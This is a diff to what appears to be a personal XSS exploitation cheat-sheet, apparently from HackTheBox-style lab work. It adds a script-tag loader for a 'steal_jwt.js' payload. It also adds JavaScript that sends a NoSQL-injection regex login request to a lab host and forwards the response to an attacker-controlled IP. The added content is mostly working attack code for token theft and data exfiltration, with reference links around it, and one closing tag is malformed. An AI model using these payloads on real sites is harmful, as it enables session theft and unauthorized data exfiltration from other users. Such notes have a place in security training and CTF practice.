@@ -28,7 +28,9 @@ python3 -m http.server -m 80
 
 ### Downloader for longer XSS payloads
 ```
+<script>
 var a=document.createElement(“script”);a.src=http://localhost:8000/steal_jwt.js;document.body.appendChild(a);
+</script
 ```
 
 ### stealing value set in a response (such as a jwt token)
@@ -54,6 +56,34 @@ https://medium.com/@agrawalsmart7/steal-csrf-auth-unique-key-header-with-xss-5a5
 
 ### HttpOnly attribute bypass
 https://www.shorebreaksecurity.com/blog/xss-exploitation-with-xhr-response-chaining/
+
+### Javascript to make a request to a page as another user
+
+
+```
+
+var data = new URLSearchParams('email[$ne]=1&password[$regex]=^69.*$');
+fetch('http://staff-review-panel.mailroom.htb/auth.php', {
+	method: 'POST',
+	headers: {
+		'Content-Type': 'application/x-www-form-urlencoded'
+	},
+	body: data.toString()
+})
+	.then(response => response.text())
+	.then(data => {
+	// Make a POST request to another website with the data
+	fetch('http://10.10.14.23/post', {
+		method: 'POST',
+		headers: {
+		'Content-Type': 'text/plain'
+	},
+	body: data
+})
+	.then(response => console.log('Data sent:', response));
+});
+
+```
 
 
 ___
